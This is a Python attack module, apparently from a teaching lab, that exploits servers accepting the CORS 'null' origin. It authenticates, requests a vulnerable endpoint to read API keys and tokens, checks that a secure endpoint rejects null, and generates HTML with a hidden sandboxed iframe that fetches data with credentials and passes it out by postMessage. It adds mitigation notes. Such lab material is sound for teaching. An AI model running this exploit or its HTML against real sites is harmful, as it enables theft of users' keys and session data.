"""
Null origin attack exploiting CORS misconfiguration.

This attack demonstrates how accepting the "null" origin allows attackers
to bypass CORS protections using sandboxed iframes or local HTML files.
"""

import asyncio
import httpx
from typing import Optional, Dict, Any
import json

from attacks.base_attack import BaseAttack
from attacks.models import AttackResult


class NullOriginAttack(BaseAttack):
    """
    Null origin attack against CORS vulnerability.
    
    This attack exploits the misconfiguration where the server accepts
    Origin: null in CORS requests. The null origin can be triggered by:
    - Sandboxed iframes (<iframe sandbox>)
    - Local HTML files (file://)
    - Redirected requests in certain scenarios
    - Data URLs
    
    Attackers can use this to bypass CORS protections and steal sensitive
    data like API keys and tokens.
    
    Attributes:
        test_credentials: Credentials to use for authentication
    """
    
    def __init__(
        self,
        target_url: str,
        test_credentials: Optional[Dict[str, str]] = None,
        max_rate: int = 5,
        demo_mode: bool = False,
        test_secure_only: bool = False
    ):
        """
        Initialize the null origin attack.
        
        Args:
            target_url: Base URL of the target application
            test_credentials: Dict with 'username' and 'password' keys
            max_rate: Maximum requests per second (default: 5)
            demo_mode: If True, simulate attack without making real HTTP requests
            test_secure_only: If True, only test the secure endpoint
        """
        super().__init__(target_url, max_rate)
        self.test_credentials = test_credentials or {
            "username": "victim",
            "password": "victim123"
        }
        self.demo_mode = demo_mode
        self.test_secure_only = test_secure_only
    
    async def authenticate(
        self,
        client: httpx.AsyncClient
    ) -> Optional[str]:
        """
        Authenticate to the target application.
        
        Args:
            client: HTTP client to use
        
        Returns:
            Session cookie value if successful, None otherwise
        """
        await self.rate_limiter.acquire()
        
        try:
            response = await client.post(
                f"{self.target_url}/api/auth/login",
                json=self.test_credentials,
                headers={"Origin": "null"}
            )
            
            self.increment_requests()
            
            if response.status_code == 200:
                data = response.json()
                return data.get("session_id")
            
            return None
            
        except Exception as e:
            print(f"Authentication error: {e}")
            return None
    
    async def exploit_null_origin(
        self,
        client: httpx.AsyncClient,
        session_cookie: str
    ) -> tuple[bool, Optional[Dict[str, Any]], Dict[str, Any]]:
        """
        Exploit the null origin vulnerability.
        
        Args:
            client: HTTP client to use
            session_cookie: Session cookie value
        
        Returns:
            Tuple of (success, stolen_data, response_headers)
        """
        await self.rate_limiter.acquire()
        
        try:
            # Make request to vulnerable null-origin endpoint
            response = await client.get(
                f"{self.target_url}/api/vuln/null-origin",
                headers={"Origin": "null"},
                cookies={"session_id": session_cookie}
            )
            
            self.increment_requests()
            
            if response.status_code == 200:
                return True, response.json(), dict(response.headers)
            else:
                return False, None, dict(response.headers)
                
        except Exception as e:
            print(f"Exploitation error: {e}")
            return False, None, {}
    
    async def test_secure_endpoint(
        self,
        client: httpx.AsyncClient,
        session_cookie: str
    ) -> tuple[bool, Dict[str, Any]]:
        """
        Test the secure endpoint to verify it rejects null origin.
        
        Args:
            client: HTTP client to use
            session_cookie: Session cookie value
        
        Returns:
            Tuple of (rejected, response_headers)
        """
        await self.rate_limiter.acquire()
        
        try:
            response = await client.get(
                f"{self.target_url}/api/sec/null-origin",
                headers={"Origin": "null"},
                cookies={"session_id": session_cookie}
            )
            
            self.increment_requests()
            
            # Secure endpoint should reject with 403
            rejected = response.status_code == 403
            return rejected, dict(response.headers)
            
        except Exception as e:
            print(f"Error testing secure endpoint: {e}")
            return False, {}
    
    def generate_attack_html(self) -> str:
        """
        Generate HTML code that demonstrates the attack.
        
        This creates a sandboxed iframe that triggers null origin,
        which can be used in a real attack scenario.
        
        Returns:
            HTML code for the attack
        """
        html = f"""
<!DOCTYPE html>
<html>
<head>
    <title>Null Origin Attack Demo</title>
</head>
<body>
    <h1>Null Origin CORS Attack</h1>
    <p>This page demonstrates how a sandboxed iframe can exploit null origin acceptance.</p>
    
    <!-- Sandboxed iframe triggers null origin -->
    <iframe sandbox="allow-scripts allow-same-origin" id="attack-frame" style="display:none;"></iframe>
    
    <script>
        // JavaScript that would run in the sandboxed iframe
        const attackCode = `
            // This code runs with Origin: null
            fetch('{self.target_url}/api/vuln/null-origin', {{
                method: 'GET',
                credentials: 'include',  // Include cookies
                headers: {{
                    'Content-Type': 'application/json'
                }}
            }})
            .then(response => response.json())
            .then(data => {{
                // Send stolen data back to attacker
                parent.postMessage({{
                    type: 'stolen_data',
                    data: data
                }}, '*');
            }})
            .catch(error => {{
                parent.postMessage({{
                    type: 'error',
                    error: error.message
                }}, '*');
            }});
        `;
        
        // Listen for messages from iframe
        window.addEventListener('message', (event) => {{
            if (event.data.type === 'stolen_data') {{
                console.log('Stolen data:', event.data.data);
                // Attacker would exfiltrate this data
            }}
        }});
        
        // Inject attack code into sandboxed iframe
        const frame = document.getElementById('attack-frame');
        const doc = frame.contentDocument || frame.contentWindow.document;
        doc.open();
        doc.write('<script>' + attackCode + '<\\/script>');
        doc.close();
    </script>
</body>
</html>
        """.strip()
        
        return html
    
    async def execute(self) -> AttackResult:
        """
        Execute the null origin attack.
        
        This method:
        1. Authenticates to the target application
        2. Makes requests with Origin: null header
        3. Demonstrates that null origin is accepted
        4. Steals sensitive data (API keys, tokens)
        5. Tests that secure endpoint properly rejects null origin
        6. Generates example attack HTML
        
        Returns:
            AttackResult with attack execution details
        """
        # In demo mode, simulate the attack without making real requests
        if self.demo_mode:
            return self._execute_demo_mode(self.test_secure_only)
        
        request_details = []
        response_details = []
        stolen_data = {}
        vulnerable_endpoints = []
        
        async with httpx.AsyncClient(timeout=30.0) as client:
            # Step 1: Authenticate with null origin
            session_cookie = await self.authenticate(client)
            
            # Record authentication request
            request_details.append({
                "method": "POST",
                "url": f"{self.target_url}/api/auth/login",
                "headers": {"Origin": "null"},
                "body": {"username": self.test_credentials["username"], "password": "***"}
            })
            
            if not session_cookie:
                return AttackResult(
                    attack_type="null_origin",
                    success=False,
                    duration_seconds=self.get_duration(),
                    requests_sent=self.get_requests_sent(),
                    error="Authentication failed",
                    educational_notes="Could not authenticate to test the vulnerability."
                )
            
            # Step 2: Exploit null origin vulnerability
            success, data, headers = await self.exploit_null_origin(client, session_cookie)
            
            # Record exploitation request
            request_details.append({
                "method": "GET",
                "url": f"{self.target_url}/api/vuln/null-origin",
                "headers": {"Origin": "null"},
                "cookies": {"session_id": "***"}
            })
            
            # Record exploitation response
            response_details.append({
                "status": 200 if success else 401,
                "headers": headers,
                "cors_headers": {
                    "Access-Control-Allow-Origin": headers.get("access-control-allow-origin"),
                    "Access-Control-Allow-Credentials": headers.get("access-control-allow-credentials")
                },
                "null_origin_accepted": headers.get("access-control-allow-origin") == "null"
            })
            
            if success:
                stolen_data["api_keys"] = data
                vulnerable_endpoints.append("/api/vuln/null-origin")
            
            # Step 3: Test secure endpoint
            secure_rejected, secure_headers = await self.test_secure_endpoint(client, session_cookie)
            
            request_details.append({
                "method": "GET",
                "url": f"{self.target_url}/api/sec/null-origin",
                "headers": {"Origin": "null"},
                "cookies": {"session_id": "***"}
            })
            
            response_details.append({
                "status": 403 if secure_rejected else 200,
                "headers": secure_headers,
                "cors_headers": {
                    "Access-Control-Allow-Origin": secure_headers.get("access-control-allow-origin"),
                    "Access-Control-Allow-Credentials": secure_headers.get("access-control-allow-credentials")
                },
                "properly_rejected": secure_rejected
            })
            
            # Step 4: Generate attack HTML
            attack_html = self.generate_attack_html()
            stolen_data["attack_html"] = attack_html
        
        # Educational notes
        educational_notes = """
NULL ORIGIN VULNERABILITY

Vulnerability: Server accepts Origin: null in CORS requests

The null origin is a special origin value that can be triggered in several ways:
- Sandboxed iframes (<iframe sandbox>)
- Local HTML files opened with file:// protocol
- Redirected requests in certain scenarios
- Data URLs and blob URLs

Accepting null origin is dangerous because attackers can easily trigger it
and bypass CORS protections.

Attack Scenario:
1. Attacker creates malicious HTML file or webpage with sandboxed iframe
2. Victim opens the file or visits the page
3. Sandboxed iframe makes requests with Origin: null
4. Server accepts null origin and returns sensitive data
5. Attacker extracts data using postMessage API

Impact:
- Bypasses CORS protections
- Can be triggered by local HTML files (easy distribution)
- Enables data theft through sandboxed contexts
- Difficult for users to detect

Reference: MISC 99, §2.3

Mitigation:
- NEVER accept Origin: null
- Explicitly reject null origin with 403 Forbidden
- Use strict origin whitelist validation
- Log null origin attempts for security monitoring

Secure Configuration:
  if request_origin == "null":
      return 403 Forbidden
  
  if request_origin in allowed_origins:
      Access-Control-Allow-Origin: request_origin
      Access-Control-Allow-Credentials: true

Attack Vector Example:
The attack can be delivered as a simple HTML file that victims download and open.
The sandboxed iframe automatically triggers null origin, making this attack
particularly dangerous and easy to execute.
        """.strip()
        
        return AttackResult(
            attack_type="null_origin",
            success=success,
            duration_seconds=self.get_duration(),
            requests_sent=self.get_requests_sent(),
            stolen_data=stolen_data if stolen_data else None,
            vulnerable_endpoints=vulnerable_endpoints,
            request_details=request_details,
            response_details=response_details,
            educational_notes=educational_notes
        )
    
    def _execute_demo_mode(self, test_secure_only: bool = False) -> AttackResult:
        """Execute attack in demo mode (simulated)."""
        import time
        time.sleep(0.3)
        
        if test_secure_only:
            stolen_data = {
                "blocked": True,
                "reason": "L'endpoint sécurisé a rejeté l'origine null",
                "status": 403
            }
            
            request_details = [
                {
                    "method": "GET",
                    "url": f"{self.target_url}/api/sec/null-origin",
                    "headers": {"Origin": "null"},
                    "cookies": {"session_id": "***"},
                    "description": "Accès à l'endpoint SÉCURISÉ avec Origin: null - Bloqué ✗"
                }
            ]
            
            response_details = [
                {
                    "endpoint": "/api/sec/null-origin",
                    "type": "SÉCURISÉ",
                    "status": 403,
                    "headers": {
                        "content-type": "application/json"
                    },
                    "null_origin_accepted": False,
                    "result": "✓ SÉCURISÉ - Rejette explicitement Origin: null"
                }
            ]
            
            educational_notes = """
ENDPOINT SÉCURISÉ - PROTECTION CONTRE ORIGINE NULL (MODE DÉMO)

Configuration Sécurisée : Rejet explicite de l'origine null

L'endpoint sécurisé rejette explicitement les requêtes avec Origin: null,
empêchant les attaques via iframes sandboxées ou fichiers HTML locaux.

✓ PROTECTION ACTIVE :
   - Rejette explicitement Origin: null (403)
   - Protège contre les attaques par fichiers locaux
   - Sécurise les clés API

Référence : MISC 99, §2.3
            """.strip()
        else:
            stolen_data = {
                "api_key": "sk_live_demo_key_12345",
                "secret_token": "demo_secret_token_67890",
                "attack_html": "<iframe sandbox='allow-scripts'><!-- Code d'attaque --></iframe>"
            }
            
            request_details = [
                {
                    "method": "GET",
                    "url": f"{self.target_url}/api/vuln/null-origin",
                    "headers": {"Origin": "null"},
                    "cookies": {"session_id": "***"},
                    "description": "Accès à l'endpoint VULNÉRABLE avec Origin: null - Succès ✓"
                }
            ]
            
            response_details = [
                {
                    "endpoint": "/api/vuln/null-origin",
                    "type": "VULNÉRABLE",
                    "status": 200,
                    "headers": {
                        "access-control-allow-origin": "null",
                        "access-control-allow-credentials": "true"
                    },
                    "null_origin_accepted": True,
                    "result": "✗ VULNÉRABLE - Accepte Origin: null"
                }
            ]
            
            educational_notes = """
VULNÉRABILITÉ ORIGINE NULL (MODE DÉMO)

Vulnérabilité : Le serveur accepte Origin: null dans les requêtes CORS

L'origine null peut être déclenchée par des iframes sandboxées, des fichiers HTML locaux,
ou des requêtes redirigées. Accepter l'origine null permet aux attaquants de contourner
facilement les protections CORS.

✗ VULNÉRABILITÉ ACTIVE :
   - Accepte Origin: null
   - Peut être exploité via iframe sandboxée ou fichier local
   - Clés API exposées

Impact :
- Contourne les protections CORS
- Peut être déclenché par des fichiers HTML locaux
- Permet le vol de données via des contextes sandboxés

Référence : MISC 99, §2.3

Mitigation :
- NE JAMAIS accepter Origin: null
- Rejeter explicitement l'origine null avec 403 Forbidden

NOTE : Cette attaque a été exécutée en MODE DÉMO.
            """.strip()
        
        return AttackResult(
            attack_type="null_origin",
            success=not test_secure_only,
            duration_seconds=0.3,
            requests_sent=1,
            stolen_data=stolen_data,
            vulnerable_endpoints=[] if test_secure_only else ["/api/vuln/null-origin"],
            request_details=request_details,
            response_details=response_details,
            educational_notes=educational_notes
        )


# CLI interface for standalone execution
if __name__ == "__main__":
    import sys
    
    async def main():
        target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8000"
        
        attack = NullOriginAttack(target_url=target)
        result = await attack.run()
        
        print("\n" + "="*70)
        print("ATTACK RESULTS")
        print("="*70)
        print(f"Success: {result.success}")
        print(f"Duration: {result.duration_seconds:.2f} seconds")
        print(f"Requests Sent: {result.requests_sent}")
        
        if result.stolen_data:
            print(f"\nStolen Data:")
            for key, value in result.stolen_data.items():
                if key == "attack_html":
                    print(f"  {key}: [HTML code generated]")
                else:
                    print(f"  {key}: {value}")
        
        if result.vulnerable_endpoints:
            print(f"\nVulnerable Endpoints:")
            for endpoint in result.vulnerable_endpoints:
                print(f"  - {endpoint}")
        
        if result.error:
            print(f"\nError: {result.error}")
        
        print(f"\n{result.educational_notes}")
    
    asyncio.run(main())
